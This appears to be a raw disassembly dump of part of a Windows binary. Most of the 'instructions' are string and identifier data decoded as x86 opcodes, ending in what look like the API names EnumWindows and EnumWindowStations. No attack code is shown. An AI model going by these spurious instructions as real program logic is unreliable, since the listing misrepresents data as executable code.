  423569:	dec    ecx
  42356a:	push   ebx
  42356b:	xor    bl,BYTE PTR [edi+0x52]
  42356e:	add    BYTE PTR [eax+0x55],dl
  423571:	dec    ecx
  423572:	xor    BYTE PTR [edi+0x43],bl
  423575:	ss inc ebp
  423577:	xor    bl,BYTE PTR [edi+0x4d]
  42357a:	xor    al,0x4a
  42357c:	push   edx
  42357d:	push   ebp
  42357e:	add    BYTE PTR [esi+0x39],cl
  423581:	push   eax
  423582:	pop    edi
  423583:	push   ebp
  423584:	cmp    DWORD PTR [esi],esi
  423586:	xor    BYTE PTR [ecx],dh
  423588:	pop    edi
  423589:	dec    edi
  42358a:	dec    esi
  42358b:	push   esp
  42358c:	cmp    BYTE PTR [eax],al
  42358e:	dec    esp
  42358f:	xor    al,0x44
  423591:	xor    DWORD PTR [edi+0x4b],ebx
  423594:	xor    DWORD PTR [ebp+0x5f],eax
  423597:	pop    edx
  423598:	add    BYTE PTR [edi+esi*1+0x43],dl
  42359c:	pop    edi
  42359d:	inc    edx
  42359e:	xor    dh,BYTE PTR [ecx]
  4235a0:	push   ebx
  4235a1:	xor    DWORD PTR [ecx],edi
  4235a3:	inc    edx
  4235a4:	add    BYTE PTR [edi+0x45],al
  4235a7:	xor    al,0x38
  4235a9:	xor    BYTE PTR [eax],dh
  4235ab:	pop    edi
  4235ac:	dec    edx
  4235ad:	dec    ebx
  4235ae:	xor    eax,0x33345f4d
  4235b3:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4235b7:	pop    edi
  4235b8:	aaa    
  4235b9:	push   esi
  4235ba:	dec    ebx
  4235bb:	push   edx
  4235bc:	pop    edi
  4235bd:	inc    ebx
  4235be:	add    BYTE PTR [edx+0x35],bl
  4235c1:	dec    ebp
  4235c2:	pop    edi
  4235c3:	inc    edi
  4235c4:	dec    esi
  4235c5:	xor    al,0x49
  4235c7:	xor    eax,0x54590035
  4235cc:	push   edx
  4235cd:	pop    edi
  4235ce:	push   esp
  4235cf:	inc    ebx
  4235d0:	inc    ecx
  4235d1:	pop    edi
  4235d2:	cmp    DWORD PTR [ecx+0x41],ebx
  4235d5:	push   ebp
  4235d6:	pop    edi
  4235d7:	push   ebp
  4235d8:	inc    ebp
  4235d9:	add    BYTE PTR [esi+esi*1+0x35],cl
  4235dd:	pop    edi
  4235de:	pop    eax
  4235df:	dec    edx
  4235e0:	inc    edx
  4235e1:	inc    edi
  4235e2:	add    BYTE PTR [edx+0x36],al
  4235e5:	inc    ebx
  4235e6:	pop    edi
  4235e7:	xor    BYTE PTR ds:0x36464b,dh
  4235ed:	dec    ebx
  4235ee:	cmp    DWORD PTR [esi+0x37],eax
  4235f1:	xor    ebx,DWORD PTR [edi+0x35]
  4235f4:	ss inc edi
  4235f6:	pop    ecx
  4235f7:	dec    eax
  4235f8:	pop    ecx
  4235f9:	add    BYTE PTR [ebp+0x35],cl
  4235fc:	push   eax
  4235fd:	xor    BYTE PTR [edi+0x4f],bl
  423600:	pop    ecx
  423601:	xor    cl,BYTE PTR [edi+0x0]
  423604:	pop    ecx
  423605:	xor    DWORD PTR [esi+0x5f],ecx
  423608:	xor    al,BYTE PTR [edx+0x30]
  42360b:	push   esi
  42360c:	push   esp
  42360d:	inc    ebp
  42360e:	add    BYTE PTR [edi+0x37],al
  423611:	push   esi
  423612:	xor    DWORD PTR [edi+0x49],ebx
  423615:	xor    al,BYTE PTR [esi+0x30]
  423618:	pop    edi
  423619:	ss dec esi
  42361b:	cmp    BYTE PTR [eax],al
  42361d:	pop    edx
  42361e:	xor    eax,0x445f334b
  423623:	xor    BYTE PTR [eax],bh
  423625:	push   ecx
  423626:	push   esi
  423627:	xor    al,0x0
  423629:	push   ebp
  42362a:	pop    eax
  42362b:	inc    edi
  42362c:	xor    DWORD PTR [edi+0x39],ebx
  42362f:	push   esp
  423630:	inc    ebx
  423631:	aaa    
  423632:	inc    esp
  423633:	add    BYTE PTR [edi+0x39],dl
  423636:	ss pop edi
  423638:	dec    eax
  423639:	pop    edx
  42363a:	pop    ecx
  42363b:	inc    edi
  42363c:	push   ebp
  42363d:	pop    edi
  42363e:	push   eax
  42363f:	dec    eax
  423640:	inc    ebx
  423641:	add    BYTE PTR [ebp+0x0],dl
  423644:	xor    al,0x0
  423646:	dec    edi
  423647:	add    BYTE PTR [edi+0x0],bl
  42364a:	cmp    BYTE PTR [eax],al
  42364c:	xor    al,BYTE PTR [eax]
  42364e:	inc    ebx
  42364f:	add    BYTE PTR [edx+0x0],bl
  423652:	inc    ebx
  423653:	add    BYTE PTR [edi],dh
  423655:	add    BYTE PTR [edi+0x0],bl
  423658:	inc    ebx
  423659:	add    BYTE PTR [eax+eax*1+0x0],al
  42365d:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423661:	add    BYTE PTR [edx],dh
  423663:	add    BYTE PTR [edi+0x0],bl
  423666:	cmp    BYTE PTR [eax],al
  423668:	dec    esp
  423669:	add    BYTE PTR [esi+0x0],dl
  42366c:	pop    edi
  42366d:	add    BYTE PTR [ecx+0x0],bl
  423670:	push   edx
  423671:	add    BYTE PTR [esi+0x0],dl
  423674:	xor    al,BYTE PTR [eax]
  423676:	cmp    BYTE PTR [eax],al
  423678:	pop    edi
  423679:	add    BYTE PTR [edx+0x0],cl
  42367c:	add    BYTE PTR [eax],al
  42367e:	inc    edx
  42367f:	add    BYTE PTR [eax+eax*1+0x46],cl
  423683:	add    BYTE PTR [edi+0x0],bl
  423686:	xor    eax,DWORD PTR [eax]
  423688:	inc    ebp
  423689:	add    BYTE PTR [ecx+0x0],cl
  42368c:	push   edx
  42368d:	add    BYTE PTR [ecx],bh
  42368f:	add    BYTE PTR [esi+0x0],dl
  423692:	add    BYTE PTR [eax],al
  423694:	dec    ebp
  423695:	add    BYTE PTR [edi],dh
  423697:	add    BYTE PTR [eax+eax*1+0x5f],al
  42369b:	add    BYTE PTR [edx+0x0],cl
  42369e:	pop    eax
  42369f:	add    BYTE PTR [ebx],dh
  4236a1:	add    BYTE PTR [ecx],dh
  4236a3:	add    BYTE PTR [ebx+0x0],al
  4236a6:	add    BYTE PTR [eax],al
  4236a8:	dec    edi
  4236a9:	add    BYTE PTR [esi],dh
  4236ab:	add    BYTE PTR [eax+0x0],cl
  4236ae:	pop    edi
  4236af:	add    BYTE PTR [eax],dh
  4236b1:	add    BYTE PTR [edi],dh
  4236b3:	add    BYTE PTR [ecx],dh
  4236b5:	add    BYTE PTR [edx+0x0],dl
  4236b8:	xor    eax,0x55000000
  4236bd:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4236c1:	add    BYTE PTR [edi+0x0],bl
  4236c4:	push   esp
  4236c5:	add    BYTE PTR [ecx+0x0],al
  4236c8:	cmp    DWORD PTR [eax],eax
  4236ca:	pop    edi
  4236cb:	add    BYTE PTR [ebx],dh
  4236cd:	add    BYTE PTR [eax],dh
  4236cf:	add    BYTE PTR [eax],bh
  4236d1:	add    BYTE PTR [edi+0x0],cl
  4236d4:	inc    ebx
  4236d5:	add    BYTE PTR ds:0x4d000000,dh
  4236db:	add    BYTE PTR [esi+0x0],cl
  4236de:	inc    ebp
  4236df:	add    BYTE PTR [edi+0x0],bl
  4236e2:	push   esp
  4236e3:	add    BYTE PTR [esi+0x0],al
  4236e6:	cmp    BYTE PTR [eax],al
  4236e8:	push   ebx
  4236e9:	add    BYTE PTR [edx+0x0],bl
  4236ec:	pop    edi
  4236ed:	add    BYTE PTR [eax],dh
  4236ef:	add    BYTE PTR [eax],bh
  4236f1:	add    BYTE PTR [eax+0x0],cl
  4236f4:	add    BYTE PTR [eax],al
  4236f6:	dec    esi
  4236f7:	add    BYTE PTR [edi+0x0],cl
  4236fa:	pop    edx
  4236fb:	add    BYTE PTR [edi+0x0],bl
  4236fe:	add    BYTE PTR ss:[ecx+0x0],bl
  423702:	dec    ebp
  423703:	add    BYTE PTR [esi],dh
  423705:	add    BYTE PTR [ebx],dh
  423707:	add    BYTE PTR [edi+0x0],bl
  42370a:	xor    al,0x0
  42370c:	dec    esi
  42370d:	add    BYTE PTR [edx],dh
  42370f:	add    BYTE PTR [esi],dh
  423711:	add    BYTE PTR [ecx],dh
  423713:	add    BYTE PTR [eax],al
  423715:	add    BYTE PTR [ebx+0x0],cl
  423718:	dec    eax
  423719:	add    BYTE PTR [eax],bh
  42371b:	add    BYTE PTR [edi+0x0],bl
  42371e:	inc    esi
  42371f:	add    BYTE PTR [esi+0x0],al
  423722:	push   esp
  423723:	add    BYTE PTR [edi],dh
  423725:	add    BYTE PTR [esi],dh
  423727:	add    BYTE PTR [edi+0x0],bl
  42372a:	dec    esp
  42372b:	add    BYTE PTR [ecx+0x0],bl
  42372e:	add    BYTE PTR [eax],al
  423730:	push   ebx
  423731:	add    BYTE PTR [ecx+0x0],bl
  423734:	xor    BYTE PTR [eax],al
  423736:	pop    edi
  423737:	add    BYTE PTR [ecx],bh
  423739:	add    BYTE PTR [edx+0x0],dl
  42373c:	dec    eax
  42373d:	add    BYTE PTR [ecx+0x0],bl
  423740:	xor    al,BYTE PTR [eax]
  423742:	pop    edi
  423743:	add    BYTE PTR [eax],dh
  423745:	add    BYTE PTR [eax],al
  423747:	add    BYTE PTR [edx+0x0],al
  42374a:	dec    edx
  42374b:	add    BYTE PTR [esi+0x0],cl
  42374e:	xor    al,BYTE PTR [eax]
  423750:	pop    edi
  423751:	add    BYTE PTR [eax+eax*1+0x33],cl
  423755:	add    BYTE PTR [edx+0x0],dl
  423758:	xor    al,0x0
  42375a:	dec    eax
  42375b:	add    BYTE PTR [eax],al
  42375d:	add    BYTE PTR [ebp+0x0],dl
  423760:	add    BYTE PTR ss:[ebp+0x0],cl
  423764:	xor    DWORD PTR [eax],eax
  423766:	pop    edi
  423767:	add    BYTE PTR [esi],dh
  423769:	add    BYTE PTR [ecx+0x0],bl
  42376c:	push   ebp
  42376d:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423771:	add    BYTE PTR [edi+0x0],cl
  423774:	inc    esp
  423775:	add    BYTE PTR [edi+0x0],dl
  423778:	push   ebx
  423779:	add    BYTE PTR [eax],al
  42377b:	add    BYTE PTR [edx+0x0],bl
  42377e:	inc    ebx
  42377f:	add    BYTE PTR [ebp+0x0],dl
  423782:	pop    edi
  423783:	add    BYTE PTR [ecx],dh
  423785:	add    BYTE PTR [ebp+0x0],al
  423788:	push   esp
  423789:	add    BYTE PTR [eax],dh
  42378b:	add    BYTE PTR [eax],al
  42378d:	add    BYTE PTR [eax],al
  42378f:	add    BYTE PTR [eax],al
  423791:	add    BYTE PTR [eax-0x7ffbffbe],al
  423797:	inc    edx
  423798:	add    BYTE PTR [eax],cl
  42379a:	add    BYTE PTR [edx+0x0],0xc
  42379e:	add    BYTE PTR [edx+0x0],0x10
  4237a2:	add    BYTE PTR [edx+0x0],0x14
  4237a6:	add    BYTE PTR [edx+0x0],0x18
  4237aa:	add    BYTE PTR [edx+0x0],0x1c
  4237ae:	add    BYTE PTR [edx+0x0],0x20
  4237b2:	add    BYTE PTR [edx+0x0],0x24
  4237b6:	add    BYTE PTR [edx+0x0],0x28
  4237ba:	add    BYTE PTR [edx+0x0],0x0
  4237be:	add    BYTE PTR [eax],al
  4237c0:	add    BYTE PTR [eax],al
  4237c2:	add    BYTE PTR [eax],al
  4237c4:	xor    ebx,DWORD PTR [edi]
  4237c6:	ja     0x423815
  4237c8:	add    BYTE PTR [eax],al
  4237ca:	add    BYTE PTR [eax],al
  4237cc:	repnz aaa 
  4237ce:	add    al,BYTE PTR [eax]
  4237d0:	add    DWORD PTR [eax],eax
  4237d2:	add    BYTE PTR [eax],al
  4237d4:	add    DWORD PTR [eax],eax
  4237d6:	add    BYTE PTR [eax],al
  4237d8:	add    DWORD PTR [eax],eax
  4237da:	add    BYTE PTR [eax],al
  4237dc:	call   0xec423a18
  4237e1:	aaa    
  4237e2:	add    al,BYTE PTR [eax]
  4237e4:	lock aaa 
  4237e6:	add    al,BYTE PTR [eax]
  4237e8:	daa    
  4237e9:	mov    BYTE PTR [eax],al
  4237eb:	add    dh,bh
  4237ed:	aaa    
  4237ee:	add    al,BYTE PTR [eax]
  4237f0:	add    BYTE PTR [eax],al
  4237f2:	push   edi
  4237f3:	outs   dx,DWORD PTR ds:[esi]
  4237f4:	jb     0x42385a
  4237f6:	push   edi
  4237f7:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4237fe:	aas    
  4237ff:	inc    ebp
  423800:	outs   dx,BYTE PTR ds:[esi]
  423801:	jne    0x423870
  423803:	push   edi
  423804:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42380b:	popa   
  42380c:	je     0x423877
  42380e:	outs   dx,DWORD PTR ds:[esi]
  42380f:	outs   dx,BYTE PTR ds:[esi]
  423810:	jae    0x423865
  423812:	je     0x423875
  423814:	.byte 0x74
